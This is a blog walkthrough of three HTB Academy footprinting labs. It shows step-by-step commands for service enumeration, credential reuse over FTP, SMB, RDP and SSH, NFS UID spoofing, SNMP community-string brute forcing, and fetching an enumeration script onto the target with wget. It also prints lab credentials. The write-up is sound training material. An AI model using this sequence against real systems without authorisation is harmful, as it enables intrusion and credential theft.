---
title: "HTB Academy: Footprinting"
date: 2026-07-17
draft: false
---
> [!info]
> The IPs shown may vary throughout as I write this blog across multiple sessions
>  
> `$RHOST`: Remote Host (Target Machine)
# Footprinting Lab - Easy

## Scenario

We were commissioned by the company **Inlanefreight Ltd** to test three different servers in their internal network. The company uses many different services, and the IT security department felt that a penetration test was necessary to gain insight into their overall security posture.

The first server is an internal DNS server that needs to be investigated. In particular, our client wants to know what information we can get out of these services and how this information could be used against its infrastructure. Our goal is to gather as much information as possible about the server and find ways to use that information against the company. However, our client has made it clear that it is forbidden to attack the services aggressively using exploits, as these services are in production.

Additionally, our teammates have found the following credentials "`ceil`:`qwer1234`", and they pointed out that some of the company's employees were talking about SSH keys on a forum.

The administrators have stored a `flag.txt` file on this server to track our progress and measure success. Fully enumerate the target and submit the contents of this file as proof.
## Overview

![[Footprinting - Easy.png]]
## Walkthrough

### Nmap

Starting off with `nmap` scans, running standard port with versions and scripts.

Standard scan
```sh
sudo nmap -sV -sC --reason -oA standardscan $RHOST 
```

This identified:
- FTP Server on 21/tcp
- SSH on 22/tcp
- DNS on 53/tcp
- Additional FTP Server on 2121/tcp with the banner `220 ProFTPD Server (Ceil's FTP)`

![[Pasted image 20260717152346.png]]
*Output of nmap scan showing open ports and identified banner*

### SSH 22 Enumeration

The scenario has provided us with some context and mentioned found a credential `ceil`:`qwer1234`, along with pointing out communication from the company's employees about SSH keys on a forum.

First try to `ssh` into the target with the given credentials `ceil`:`qwer1234`
```sh
ssh ceil@$RHOST
```

Getting a `Permission denied (publickey)`, indicating a Public-Key Authentication method is used.

![[Pasted image 20260717153126.png]]
*ssh output denoting Permission denied (publickey)*

Determine which authentication methods are accepted with the `nmap` script `ssh-auth-methods` for the user `ceil` 
```sh
sudo nmap -p22 --script ssh-auth-methods --script-args="ssh.user=ceil" $RHOST
```

This reveals the only supported authentication is through `publickey`, validating the Public-Key Authentication method.

![[Pasted image 20260717154348.png]]
*nnap ssh-auth-methods script revealing publickey as the only supported authentication method*

### FTP 2121 Enumeration
Enumerate the discovered port `2121/tcp` - `220 ProFTPD Server (Ceil's FTP)`

Connect using provided credentials `ceil`:`qwer1234` 
```sh
ftp $RHOST 2121
```

List files and directories (and hidden counterparts)
```ftp
ls -aR
```

Find the hidden `.ssh/` directory containing the private key `id_rsa`
![[Pasted image 20260717170415.png]]
*files listed from ftp server containing ssh private key file*

Download this to local host
```ftp
cd .ssh
get id_rsa
quit
```

Preview to verify content is intact
```sh
head id_rsa
```

![[Pasted image 20260717170726.png]]
*Contents of private key file id_rsa*

### Connect using SSH private key

Update permissions to meet SSH security requirements
```sh
chmod 600 id_rsa
```

SSH using retrieved private key, providing shell to user `ceil`
```sh
ssh -i id_rsa ceil@$RHOST
```

![[Pasted image 20260717171057.png]]
*SSH into user shell*

Search for `flag.txt`
```sh
find / -name "flag.txt" 2>/dev/null
```

![[Pasted image 20260717172250.png]]
*Captured flag.txt*

## Issues & How I Solved Them

This Easy box was relatively straightforward in pursuing the next steps after finding information, it was quite linear to progression so nothing of note in this.

# Footprinting Lab - Medium

## Scenario 

This second server is a server that everyone on the internal network has access to. In our discussion with our client, we pointed out that these servers are often one of the main targets for attackers and that this server should be added to the scope.

Our customer agreed to this and added this server to our scope. Here, too, the goal remains the same. We need to find out as much information as possible about this server and find ways to use it against the server itself. For the proof and protection of customer data, a user named `HTB` has been created. Accordingly, we need to obtain the credentials of this user as proof.

## Overview

![[Footprinting - Medium.png]]
## Walkthrough

### Nmap

Starting off with `nmap` standard scan
```sh
sudo nmap -sV -sC --reason -oA standardscan $RHOST 
```
Output from `nmap` scan lead to indicate that this is a windows machine.
Ports identified:
- <span style="color:#FF6666">NFS on port 111 & 2049</span>
- <span style="color:#FFFF66">WMI on port 135</span>
- <span style="color:#66FF66">SMB share on 139 and 445</span>
- <span style="color:#6666FF">RDP on 3389</span>
- <span style="color:#FF66FF">WINRM on 5985</span>

![[Pasted image 20260723164513.png]]
*Identified ports from nmap scan*

### NFS Enumeration
Lists exported shares to confirm NFS is exposed and what is shared
```sh
showmount -e $RHOST
```

Lists shares, perms, stats, mount details via NSE that was not covered by `nmap`'s standing scripts `-sC`
```sh
sudo nmap --script nfs* -sV -p111,2049 $RHOST
```

Both these commands reveal an available share `/TechSupport`
![[Pasted image 20260723174004.png]]
*NFS Enumeration commands revealing an accessible NFS share*

Create local mount point and mount to `/TechSupport` found from `showmount` and `nmap` NSE scans
```sh
mkdir target-nfs
sudo mount -t nfs -o vers=3,nolock $RHOST:/TechSupport ./target-nfs
```

List directory contents and permissions for `/target-nfs`. This shows the UID for the directory is `4294967294`, meaning `root_squash` is enabled and applied to this share directory.
```sh
ls -la
```

![[Pasted image 20260723175708.png]]
*Listing directory details show the owner of the directory has a UID of 4294967294*

With this a user can be created with the same UID that can give us permission to access the directory and contents. List directory details to verify permission resolved to local `nfsuser`
```sh
sudo useradd -u 4294967294 -o -M nfsuser
ls -la
```
![[Pasted image 20260723182040.png]]
*Listing directory details show the owner of the directory as user `nfsuser`*

Access mount as the UID and list out contents of directory
```sh
sudo -u nfsuser find ./target-nfs -ls
```
This identified a file that stood out with a higher file size, indicating file contents. 

![[Pasted image 20260724080538.png]]
*Listed NFS share revealing file of interest*

Read the contents of the file and we find a set of credentials `alex`:`lol123!mD`
```sh
sudo -u nfsuser cat ./target-nfs/ticket4238791283782.txt
```

![[Pasted image 20260724083338.png]]
*Credential found from ticket contents*

### SMB Enumeration
> [!info] Credentials
> Identified credentials has been set in the environment to
> 
> `$USER` = `alex`
> 
> `$PASS` = `lol123!mD`

Use `crackmapexec` to enumerate shares, first test with null session
```sh
crackmapexec smb $RHOST --shares -u '' -p ''
```

This returned `WINMEDIUM\: STATUS_ACCESS_DENIED`. 

Next is to try use the gathered credential from NFS `alex`:`lol123!mD`
```sh
crackmapexec smb $RHOST --shares -u $USER -p $PASS
```
The credentials work and this reveals `devshare` with `READ,WRITE` access.
![[Pasted image 20260724100916.png]]
*`crackmapexec` enumerating shares accessible by the user `alex`, revealing `devshare`*

Access `devshare` using `smbclient`
```sh
smbclient //$RHOST/devshare -U $USER%$PASS
```
List contents
```smb
ls
```
Here a file is found `important.txt`, download file to our machine and view contents.
```sh
get important.txt
!cat important.txt; ehco
```
This reveals another set of credentials `sa`:`87N1ns@slls83`. `sa` is typically tied to a System Administrator for MSSQL.
![[Pasted image 20260724103742.png]]
*Contents of `important.txt` file found from smb share `devshare`*

### RDP Enumeration
Exploring the RDP service, a connection can be made using alex's credentials `alex:lol123!mD`
```sh
xfreerdp /u:$USER /p:$PASS /v:$RHOST
```
This leads to a windows desktop and shortcut to `Microsoft SQL Server Manamgent Studio 18`.
![[Pasted image 20260726215938.png]]
*Remote desktop on a windows machine with shortcut to MSSQL Server Management*
Run this as administrator using the credential found `sa`:`87N1ns@slls83`. Connect to the server using `Windows Authentication`
![[Pasted image 20260726220150.png]]
*SQL Server connect with Windows Authentication*

### MSSQL Enumeration

Enumerate the MSSQL Database for information
1. List Databases, this will reveal a non default database called `accounts`
```MSSQL
SELECT name FROM sys.databases;
```
2. Switch to database `accounts`
```MSSQL
USE accounts;
```
3. List tables in `accounts` database, this reveals a table called `devsacc`
```MSSQL
SELECT table_name
FROM information_schema.tables
WHERE table_type = 'BASE TABLE';
```
4. Show all columns in `devsacc` table, revealing columns `id`, `name`, and `password`
```MSSQL
SELECT column_name
FROM information_schema.columns
WHERE table_name = 'devsacc';
```
5. Show all records from `devsacc` table, this will return a list of users and their passwords.
```MSSQL
SELECT * FROM devsacc;
```
6. Query to return information for the target user `HTB`. Returning the password as the flag.
```MSSQL
SELECT *
FROM devsacc
WHERE name = 'HTB';
```
![[Pasted image 20260726221917.png]]
![[Pasted image 20260726222709.png]]
![[Pasted image 20260726223251.png]]
## Issues & How I Solved Them

**Issue 1:**

During NFS Enumeration, the command I had used to mount to the `/TechSupport` share worked however it had shown the owner of the file as `nobody`, preventing me in accessing the share drive and viewing contents even when running sudo as a user matching the UID of the file.
The command I initially used:
```sh
sudo mount -t nfs -o nolock $RHOST:/TechSupport ./target-nfs
```

**Solution 1:**

Specifying the version revealed the file UID when `ls -la`, from there creating a user with matching UID I was able to access the share directory and contents.
```sh
sudo mount -t nfs -o vers=3,nolock $RHOST:/TechSupport ./target-nfs
```

**Issue 2:**

Trying to find the next step after finding credentials for `sa`:`87N1ns@slls83`. I had tried using credentials from `alex` and `sa` on other services but did not find anything further, reaching a roadblock.

**Solution:**

I got assistance from Claude, specifically asking not to reveal the answers but prompt me in the right direction. I found that my notes had a flaw affecting the long process for `rdp`.
I had ran `xfreerdp` command while and putting the env value into the single quote, hence it had put that as the raw value of `$PASS` as the password. 
```sh
xfreerdp /u:$USER /p:'$PASS' /v:$RHOST
```
Removing the single quote and using `alex`'s credentials granted a connection
```sh
xfreerdp /u:$USER /p:$PASS /v:$RHOST
```


# Footprinting - Hard 

## Scenario

The third server is an MX and management server for the internal network. Subsequently, this server has the function of a backup server for the internal accounts in the domain. Accordingly, a user named `HTB` was also created here, whose credentials we need to access.

## Overview


![[Footprinting - Hard.png]]
## Walkthrough

### Nmap
Start service enumeration with `nmap` scan, running standard scan covering versions, NSE scripts, and reason for more verbose output. Running all port scan and UDP scan in the background to ensure full coverage.

Standard scan
```shell
sudo nmap -sV -sC --reason -oA standardscan $RHOST 
```
All port scan - run in background
```shell
sudo nmap -p- -T4 -oA allports $RHOST
```
UDP Scan
```sh
sudo nmap -sU -p- -T4 --min-rate=500 --max-retries=2 --reason -oA udpallfull $RHOST
```

Nmap scans identified
- SSH on port 22
- pop3 on ports 110 and 995
- imap on ports 143 and 993
- SNMP on UDP 161

![[Pasted image 20260731170633.png]]
*nmap TCP scan*
![[Pasted image 20260731171001.png]]
*nmap UDP scan*

### SNMP Enumeration

Perform community string brute forcing with `onesixone`
```sh
onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt $RHOST
```
This found the community string `backup`
![[Pasted image 20260731171307.png]]
*brute forcer `onesixone` revealing community string `backup`*

Using this community string we can perform a targeted OID brute force using `braa`
```sh
braa backup@$RHOST:.1.3.6.*
```
This reveals a credential `tom`:`NMds732Js2761`
![[Pasted image 20260731171728.png]]
*Credential exposed through OID brute forcing*


### POP3 Enumeration
Connect to the POP3 server
```sh
nc -nv $RHOST 110
```
Login with identified credentials
```nc
USER tom
PASS NMds732Js2761
```
Scope mailbox and list messages
```nc
STAT
LIST
```
Read raw message header and body
```nc
RETR 1
```
This returns and email with the subject `KEY` with the content an openssh private key
![[Pasted image 20260731173156.png]]
*Email content with openssh private key*
Copy the private key into local file `id_rsa`.

### Connect via SSH using private key 
Use `nmap` to determine accepted auth methods the user `tom`
```sh
sudo nmap -p22 --script ssh-auth-methods --script-args="ssh.user=$USER" $RHOST
```
The only supported auth method being `publickey'

![[Pasted image 20260731173805.png]]
*Nmap scan listing supported authentication of `publickey`*

With the private key, change permissions to meet security requirements
```sh
chmod 600 id_rsa
```
Connect with the private key `id_rsa`
```sh
ssh -i id_rsa $USER@$RHOST
```
This provides us a shell to `tom`'s account

![[Pasted image 20260731174559.png]]
*SSH into `tom`'s account*

### Linux Enumeration
Open listener to transfer `LinEnum.sh` from local host
```sh
sudo python3 -m http.server 8000
```
`wget` `LinEnum.sh` to local host from remote host
```sh
wget http://$LHOST:8000/LinEnum.sh
```

Running `LinEnum.sh` on `tom`'s shell reveals `MySQL` is used, along with `.bash_history` show usage of `MySQL` logging in with user `tom`
![[Pasted image 20260731175446.png]]
![[Pasted image 20260731180100.png]]
*LinEnum.sh output revealing usage of `MySQL`*

Logging into `MySQL` with user `tom`, enter the password once the prompt appears `NMds732Js2761`
```sh
mysql -u tom -p
```

This gives us access to the `MySQL` server

![[Pasted image 20260731180320.png]]
*Connection to `MySQL` Server*

### Enumerate MySQL

List databases
```mysql
SHOW DATABASES;
```
This lists a database called `users`
![[Pasted image 20260731180602.png]]
*MySQL list of databases, including `users`*

Select the `users` database
```mysql
USE users;
```
List tables in the database
```mysql
SHOW TABLES;
```
This reveals a table called `users`
![[Pasted image 20260731180937.png]]
*Tables listed in the database `users`*

Identify column names/types
```mysql
SHOW COLUMNS FROM users;
```
![[Pasted image 20260731181055.png]]
*Listed Columns for Fields in the table and Type*

Target search for the user `HTB`
```mysql
SELECT * FROM users WHERE username='HTB';
```
This reveals the password for the user `HTB`
![[Pasted image 20260731181622.png]]
*`MySQL` targeted search on the user `HTB` to reveal the password*
## Issues & How I Solved Them

I found this box to be easier than medium, I only hit a roadblock initially in my enumeration. I had discovered SSH, POP3, and IMAP services but did not have any credentials to access any of the services. What I overlooked was performing a UDP scan to find the management server that was mentioned in the scenario.

Solution:
Performing UDP scan revealed SNMP server, performing Community String Brute-force revealed a community string with allowed me to perform SNMP walk to find user credentials.

# Key Learnings

1. Always perform a TCP scan and UDP scan for all ports for thorough enumeration process and to not miss any ports, start with breath of enumeration gather as much information as possible and then dive into depth.